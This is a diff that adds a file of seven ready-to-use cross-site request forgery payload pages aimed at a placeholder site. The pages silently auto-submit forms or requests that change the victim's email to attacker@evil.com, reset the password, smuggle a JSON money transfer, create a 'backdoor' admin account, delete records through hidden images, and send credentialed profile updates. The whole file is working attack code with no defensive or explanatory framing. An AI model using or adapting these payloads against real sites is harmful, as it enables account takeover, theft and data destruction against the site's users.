@@ -1,0 +1,77 @@
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://vulnerable-website.com/email/change" method="POST">
+      <input type="hidden" name="email" value="attacker@evil.com" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+<html>
+  <body>
+    <form action="https://vulnerable-website.com/password/change" method="POST">
+      <input type="hidden" name="password" value="Pwned123!" />
+      <input type="hidden" name="confirm_password" value="Pwned123!" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+<html>
+  <body>
+    <form action="https://vulnerable-website.com/api/transfer" method="POST" enctype="text/plain">
+      <input name='{"amount":10000,"to":"attacker","ignore":"' value='"}' type="hidden">
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+<html>
+  <body>
+    <script>
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://vulnerable-website.com/api/admin/create", true);
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      xhr.withCredentials = true;
+      xhr.send("username=backdoor&password=backdoor&role=admin");
+    </script>
+  </body>
+</html>
+
+<html>
+  <body>
+    <img src="https://vulnerable-website.com/api/delete?id=1" style="display:none">
+    <img src="https://vulnerable-website.com/api/delete?id=2" style="display:none">
+    <img src="https://vulnerable-website.com/api/delete?id=3" style="display:none">
+  </body>
+</html>
+
+<html>
+  <body>
+    <iframe style="display:none" name="csrf_frame"></iframe>
+    <form action="https://vulnerable-website.com/settings" method="POST" target="csrf_frame">
+      <input type="hidden" name="email" value="attacker@evil.com" />
+    </form>
+    <script>document.forms[0].submit();</script>
+  </body>
+</html>
+
+<html>
+  <body>
+    <script>
+      fetch('https://vulnerable-website.com/api/profile', {
+        method: 'PUT',
+        credentials: 'include',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({email: 'attacker@evil.com'})
+      });
+    </script>
+  </body>
+</html>
